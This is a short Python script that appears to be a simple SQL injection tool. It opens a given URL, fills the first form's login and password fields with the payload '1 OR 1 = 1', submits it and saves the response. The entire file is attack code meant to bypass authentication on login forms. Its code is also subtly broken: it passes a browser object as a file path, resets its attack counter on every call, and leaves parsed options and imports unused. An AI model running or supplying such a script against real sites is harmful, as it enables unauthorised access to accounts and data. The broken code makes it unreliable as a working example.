import argparse, requests, urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import mechanize

def output_file(output_file_path, content):
    with open(output_file_path, 'w') as file:
        file.write(content)

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("URL", help="URL for the request")
    parser.add_argument("-o", dest="output", default="output.txt", help="Specify an output file, default: output")
    parser.add_argument("-X", dest="request_type", default="GET", help="Type of request")
    return parser.parse_args()

def detect_error(output, content):
    attack_no = 1
    output_file(output, content)
    output_file('response/' + str(attack_no) + '.txt', content)
    print(f"{attack_no}")
    attack_no += 1

def send_injection(request):
    request.select_form(nr=0)
    request['login'] = "1 OR 1 = 1"
    request['password'] = "1 OR 1 = 1"
    response = request.submit()
    content = response.read()
    return content

def main():
    args = parse_arguments()
    request = mechanize.Browser()
    request.open(args.URL)
    content = send_injection(request)
    print(f"{content}")
    detect_error(request, content)

if __name__ == "__main__":
    main()
